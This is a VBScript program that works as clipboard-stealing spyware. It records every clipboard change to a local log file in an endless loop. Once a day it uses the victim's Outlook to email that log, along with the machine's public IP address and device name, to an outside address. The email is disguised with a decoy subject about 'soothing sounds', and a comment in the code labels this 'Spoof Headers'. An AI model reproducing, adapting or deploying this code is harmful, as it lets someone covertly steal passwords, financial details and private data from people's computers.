Const ForAppending = 8
Const DelaySeconds = 1

Set objShell = CreateObject("WScript.Shell")
strFolder = objShell.CurrentDirectory
strFilePath = strFolder & "\cliplog.txt"

Set objFSO = CreateObject("Scripting.FileSystemObject")

Function GetCurrentDateTime()
    Dim dt
    dt = Now
    GetCurrentDateTime = FormatDateTime(dt, vbShortDate) & " " & FormatDateTime(dt, vbShortTime)
End Function

Function GetNewestClipboardContent()
    On Error Resume Next
    Set objHTML = CreateObject("htmlfile")
    If Err.Number <> 0 Then
        GetNewestClipboardContent = "" ' Return an empty string if clipboard access fails
    Else
        Set objData = objHTML.ParentWindow.ClipboardData
        GetNewestClipboardContent = objData.GetData("text")
    End If
    On Error GoTo 0
End Function

Sub MonitorClipboard()
    Dim strDateTime, strContent, strPrevContent
    strPrevContent = ""

    Do
        strContent = GetNewestClipboardContent()

        If strContent <> strPrevContent Then
            strDateTime = "[" & GetCurrentDateTime() & "]"
            Set objLogFile = objFSO.OpenTextFile(strFilePath, ForAppending, True)
            objLogFile.WriteLine strDateTime & vbNewLine & strContent
            objLogFile.Close
            strPrevContent = strContent
        End If

        WScript.Sleep DelaySeconds * 1000
    Loop
End Sub

Function SERVER_ACCESS_STATUS()
    Dim objFSO, objFile, strFilePath, strToday, strFileContent

    strScriptDir = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))
    strToday = Right("0" & Day(Date), 2) & "/" & Right("0" & Month(Date), 2) & "/" & Year(Date)
    strFilePath = strScriptDir & "\send_dates.txt"

    Set objFSO = CreateObject("Scripting.FileSystemObject")

    If objFSO.FileExists(strFilePath) Then
        Set objFile = objFSO.OpenTextFile(strFilePath, 1)
        strFileContent = objFile.ReadAll
        objFile.Close

        If InStr(strFileContent, strToday) > 0 Then
            SERVER_ACCESS_STATUS = 1
        Else
            Set objFile = objFSO.OpenTextFile(strFilePath, 8)
            objFile.WriteLine vbNewLine & strToday
            objFile.Close
            SERVER_ACCESS_STATUS = 2
        End If
    Else
        Set objFile = objFSO.CreateTextFile(strFilePath)
        objFile.WriteLine strToday
        objFile.Close
        SERVER_ACCESS_STATUS = 3
    End If
End Function

'Time
Function TIME_NOW()
    Dim dt
    dt = Now
    Get_Time = "[" & Right("0" & Day(dt), 2) & "/" & Right("0" & Month(dt), 2) & "/" & Year(dt) & "] [" & Right("0" & Hour(dt), 2) & ":" & Right("0" & Minute(dt), 2) & ":" & Right("0" & Second(dt), 2) & "]"
    TIME_NOW = Get_Time
End Function

'Public IP
Function IP_ADDRESS()
    Dim objHTTP, strHTML
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    objHTTP.Open "GET", "https://api.ipify.org", False
    objHTTP.setRequestHeader "Content-Type", "text/xml"
    objHTTP.setRequestHeader "User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X)"
    objHTTP.send
    strHTML = objHTTP.responseText
    IP_ADDRESS = strHTML
End Function

'Device Name
Function DEVICE_NAME()
    Set WshNetwork = WScript.CreateObject("WScript.Network")
    DEVICE_NAME = WshNetwork.Computername
End Function

'END OF FUNCTIONS

Function SEND_MAIL()
    On Error Resume Next
    
    Const olMailItem = 0
    Const olFormatHTML = 2

    Set objOutlook = CreateObject("Outlook.Application")
    If Err.Number <> 0 Then
        WScript.Echo "Error creating Outlook application object."
        Exit Function
    End If
    
    Set objMail = objOutlook.CreateItem(olMailItem)
    If Err.Number <> 0 Then
        WScript.Echo "Error creating mail item."
        Exit Function
    End If

    'Spoof Headers 
    objMail.Subject = "Fall asleep to these soothing sounds."
    objMail.BodyFormat = olFormatHTML
    objMail.Body = "Sounds that help you reach your dreams." & vbNewLine & vbNewLine & TIME_NOW() & vbNewLine & IP_ADDRESS() & vbNewLine & DEVICE_NAME()

    'Recipient Email
    objMail.To = "sample@gmail.com"

    Dim strFilePath, strScriptDir

    strScriptDir = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))
    strFilePath = strScriptDir & "\cliplog.txt"

    Set objFSO = CreateObject("Scripting.FileSystemObject")
    If objFSO.FileExists(strFilePath) Then
        objMail.Attachments.Add strFilePath
        WScript.Echo "Attached document."
    Else
        WScript.Echo "Attachment file not found: " & strFilePath
    End If

    objMail.Send
    If Err.Number <> 0 Then
        WScript.Echo "Error sending email."
    Else
        WScript.Echo "Email sent successfully."
    End If

    Set objMail = Nothing
    Set objOutlook = Nothing
End Function


Select Case SERVER_ACCESS_STATUS()
    Case 1
        ' Code block to execute if SERVER_ACCESS_STATUS() is 1
        Wscript.Echo "SERVER_ACCESS_STATUS() already sent data"
    Case 2
        ' Code block to execute if SERVER_ACCESS_STATUS() is 2
Wscript.Echo "NEW MAIL"
        SEND_MAIL
    Case 3
        ' Code block to execute if SERVER_ACCESS_STATUS() is 3
        SEND_MAIL
    Case Else
        ' Code block to execute if SERVER_ACCESS_STATUS() does not match any of the specified cases
        Wscript.Echo "SERVER_ACCESS_STATUS() returned exception"
End Select

MonitorClipboard